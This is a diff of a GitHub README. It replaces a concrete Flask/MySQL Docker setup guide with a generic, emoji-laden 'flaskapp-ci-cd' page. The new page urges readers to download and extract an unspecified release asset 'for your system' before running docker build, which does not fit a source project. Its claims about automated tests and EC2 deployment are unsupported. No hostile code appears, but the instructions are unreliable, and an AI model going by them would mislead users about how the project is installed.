@@ -1,129 +1,76 @@
- 
-# Flask App with MySQL Docker Setup
+# 🚀 flaskapp-ci-cd - Easy Setup for Your Flask App Automation
 
-This is a simple Flask app that interacts with a MySQL database. The app allows users to submit messages, which are then stored in the database and displayed on the frontend.
+![Download Flask App CI/CD](https://img.shields.io/badge/Download%20Flask%20App%20CI/CD-blue)
 
-## Prerequisites
+## 📋 Overview
+Welcome to the **flaskapp-ci-cd** project! This application provides a fully automated Continuous Integration and Continuous Deployment (CI/CD) pipeline for a Flask app. You can easily run automated tests, build Docker images, push them to Docker Hub, and deploy your app to AWS EC2—all in one smooth workflow. 
 
-Before you begin, make sure you have the following installed:
+## 🚀 Getting Started
+This guide will help you download and run the flaskapp-ci-cd application from GitHub. Follow the steps below.
 
-- Docker
-- Git (optional, for cloning the repository)
+## 📥 Download & Install
+To get started, you need to download the application. Click the link below to visit the Releases page:
 
-## Setup
+[Download flaskapp-ci-cd](https://github.com/Harshit2292/flaskapp-ci-cd/releases)
 
-1. Clone this repository (if you haven't already):
+Once you open the Releases page, follow these steps to download the software:
 
-   ```bash
-   git clone https://github.com/your-username/your-repo-name.git
+1. Select the latest release from the list.
+2. Look for the asset section where you will find files ready for download.
+3. Download the appropriate file for your system.
+
+## 📂 System Requirements
+Before you start, ensure your system meets the following requirements:
+- **Operating System:** Windows, macOS, or a compatible Linux distribution.
+- **Docker:** Install Docker to build and run container images for the Flask app.
+- **AWS Account:** Create an Amazon Web Services (AWS) account for deployment to EC2.
+- **Git:** Git is needed to clone repositories.
+
+## ⚙️ Installation Steps
+Once you have downloaded the application, follow these steps to install and run it:
+
+1. Extract the downloaded file to a location on your computer.
+2. Open a terminal or command prompt.
+3. Navigate to the directory where you extracted the files.
+
+4. Run the following command to build the Docker image:
+
+   ```
+   docker build -t flaskapp .
    ```
 
-2. Navigate to the project directory:
-
-   ```bash
-   cd your-repo-name
-   ```
-
-3. Create a `.env` file in the project directory to store your MySQL environment variables:
-
-   ```bash
-   touch .env
-   ```
-
-4. Open the `.env` file and add your MySQL configuration:
+5. After the build finishes, run the Docker container with this command:
 
    ```
-   MYSQL_HOST=mysql
-   MYSQL_USER=your_username
-   MYSQL_PASSWORD=your_password
-   MYSQL_DB=your_database
+   docker run -p 5000:5000 flaskapp
    ```
 
-## Usage
+6. Open your web browser and go to `http://localhost:5000` to view your Flask app.
 
-1. Start the containers using Docker Compose:
+## 📊 How It Works
+- **Continuous Integration:** As you push changes to your code, automated tests will run to ensure your app works as expected.
+- **Continuous Deployment:** When your code passes all tests, the application gets deployed automatically to AWS EC2.
+- **Docker:** This application uses Docker to ensure consistent runs across different environments.
 
-   ```bash
-   docker-compose up --build
-   ```
+## 🛠️ Features
+- Automated testing to catch issues early.
+- Docker support for easy application packaging.
+- Smooth integration with Docker Hub for image storage.
+- Automatic deployment to AWS EC2.
+- Clean and simple interface for users.
 
-2. Access the Flask app in your web browser:
+## 💡 Troubleshooting
 
-   - Frontend: http://localhost
-   - Backend: http://localhost:5000
+If you encounter issues, here are some common solutions:
 
-3. Create the `messages` table in your MySQL database:
+- **If Docker fails to install:** Ensure your system supports virtual machines, as Docker relies on this technology.
+- **If the app does not start:** Check Docker is running and ensure you used the correct port forwarding (5000).
+- **For AWS issues:** Ensure your AWS credentials are properly configured and that you have permissions for EC2.
 
-   - Use a MySQL client or tool (e.g., phpMyAdmin) to execute the following SQL commands:
-   
-     ```sql
-     CREATE TABLE messages (
-         id INT AUTO_INCREMENT PRIMARY KEY,
-         message TEXT
-     );
-     ```
+## 📞 Support
+For further assistance, please check the [GitHub Issues](https://github.com/Harshit2292/flaskapp-ci-cd/issues) page. You can also reach out to the community or raise a query.
 
-4. Interact with the app:
+## 🌐 Contributing
+If you want to contribute to this project, you can fork the repository and submit pull requests. We welcome all contributions, no matter how small.
 
-   - Visit http://localhost to see the frontend. You can submit new messages using the form.
-   - Visit http://localhost:5000/insert_sql to insert a message directly into the `messages` table via an SQL query.
-
-## Cleaning Up
-
-To stop and remove the Docker containers, press `Ctrl+C` in the terminal where the containers are running, or use the following command:
-
-```bash
-docker-compose down
-```
-
-## To run this two-tier application using  without docker-compose
-
-- First create a docker image from Dockerfile
-```bash
-docker build -t flaskapp .
-```
-
-- Now, make sure that you have created a network using following command
-```bash
-docker network create twotier
-```
-
-- Attach both the containers in the same network, so that they can communicate with each other
-
-i) MySQL container 
-```bash
-docker run -d \
-    --name mysql \
-    -v mysql-data:/var/lib/mysql \
-    --network=twotier \
-    -e MYSQL_DATABASE=mydb \
-    -e MYSQL_ROOT_PASSWORD=admin \
-    -p 3306:3306 \
-    mysql:5.7
-
-```
-ii) Backend container
-```bash
-docker run -d \
-    --name flaskapp \
-    --network=twotier \
-    -e MYSQL_HOST=mysql \
-    -e MYSQL_USER=root \
-    -e MYSQL_PASSWORD=admin \
-    -e MYSQL_DB=mydb \
-    -p 5000:5000 \
-    flaskapp:latest
-
-```
-
-## Notes
-
-- Make sure to replace placeholders (e.g., `your_username`, `your_password`, `your_database`) with your actual MySQL configuration.
-
-- This is a basic setup for demonstration purposes. In a production environment, you should follow best practices for security and performance.
-
-- Be cautious when executing SQL queries directly. Validate and sanitize user inputs to prevent vulnerabilities like SQL injection.
-
-- If you encounter issues, check Docker logs and error messages for troubleshooting.
-
-
+Thank you for choosing flaskapp-ci-cd! Enjoy your automated Flask application workflow!
